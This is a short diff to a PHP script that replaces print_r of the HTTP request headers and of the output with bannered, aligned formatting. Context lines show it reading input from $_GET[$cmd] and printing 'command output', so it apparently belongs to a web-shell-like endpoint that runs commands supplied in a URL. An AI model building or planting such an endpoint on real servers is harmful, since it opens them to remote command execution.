@@ -16,7 +16,16 @@ try {
             $headers[$header] = $value;
         }
     }
-    print_r($headers);
+    // Print headers in a nicely formatted way
+    echo "\n===== HTTP REQUEST HEADERS =====\n\n";
+    $maxLength = 0;
+    foreach ($headers as $name => $value) {
+        $maxLength = max($maxLength, strlen($name));
+    }
+    foreach ($headers as $name => $value) {
+        echo str_pad($name, $maxLength + 2, ' ') . ": " . $value . "\n";
+    }
+    echo "\n===============================\n\n";
 
     $input = $_GET[$cmd];
 
@@ -43,7 +52,9 @@ try {
 
     // Display output with proper formatting for multiline content
     header('Content-Type: text/plain');
+    echo "\n===== COMMAND OUTPUT =====\n\n";
     echo $output;
+    echo "\n\n==========================\n";
 
 } catch (Exception $e) {
     // Catch any exceptions and display the error message
